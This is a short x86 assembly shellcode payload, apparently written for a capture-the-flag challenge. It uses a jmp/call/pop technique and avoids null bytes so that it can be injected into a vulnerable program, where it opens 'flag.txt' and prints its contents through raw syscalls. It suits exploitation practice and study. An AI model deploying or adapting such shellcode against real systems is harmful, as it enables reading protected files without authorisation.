.macro FILENAME
        .ascii "flag.txtN"
.endm
.set FILELEN, 8

# use .data for self-modifying code
.section .data
.globl _start
_start:
        jmp find_file
file_back:
        # pop the address of `file` into %ebx
        pop %ebx

        # null-terminate filename
        xor %eax, %eax
        movb %al, FILELEN(%ebx)

        # call open
        xor %ecx, %ecx  # set flags to 0 (O_RDONLY)
        xor %edx, %edx  # set mode to 0 (irrelevant since we aren't creating)
        movb $5, %al
        int $0x80
        movl %eax, %ebp  # move the returned fd into %ebp for safekeeping

        jmp find_flag
flag_back:
        # peek the address of `flag` into %ecx
        movl (%esp), %ecx

        # set %ebx to the fd
        movl %ebp, %ebx

        # read 1 byte at a time
        xor %edx, %edx
        movb $1, %dl

        # call read
        xor %eax, %eax
        movb $3, %al
        int $0x80

        # exit on EOF
        xor %edx, %edx
        cmpl %edx, %eax
        jle exit

        # pop the address of `flag` into %ecx
        popl %ecx

        # use fd 1 (stdout)
        xor %ebx, %ebx
        movb $1, %bl

        # set %edx to the number of bytes read
        mov %eax, %edx

        # call write
        xor %eax, %eax
        movb $4, %al
        int $0x80
find_flag:
        call flag_back
flag:
        # space of 2 for flag file - byte and null
        .ascii "XN"
find_file:
        call file_back
file:
        FILENAME
exit:
        # call exit(0)
        xor %eax, %eax
        movb $1, %al
        xor %ebx, %ebx
        int $0x80
